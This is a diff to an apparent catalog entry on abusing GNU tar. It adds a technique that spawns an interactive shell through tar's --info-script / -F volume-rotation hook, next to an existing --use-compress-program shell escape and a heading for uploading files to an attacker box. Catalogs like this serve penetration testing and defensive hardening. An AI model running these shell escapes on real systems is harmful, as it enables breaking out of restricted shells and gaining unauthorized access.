@@ -7,6 +7,9 @@ functions:
     - description: Similar to the above, but at a previous stage in the extraction. A valid archive is not required. This functionality can be abused in various ways for file-read and file-write (see below).
       code: |
         tar xf /dev/null --use-compress-program='/bin/sh -c "sh <&2 1>&2"'
+    - description: GNU tar specifc. The -F / --info-script= / --new-volume-script= arguments will run a command at volume rotation. Other flags used are to force frequent rotation.
+      code: |
+        tar cf /dev/null --record-size=512 -L1 -F'/bin/sh -c "sh <&2 1>&2"' /tmp/
   file-upload:
     - description: This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
       code: |
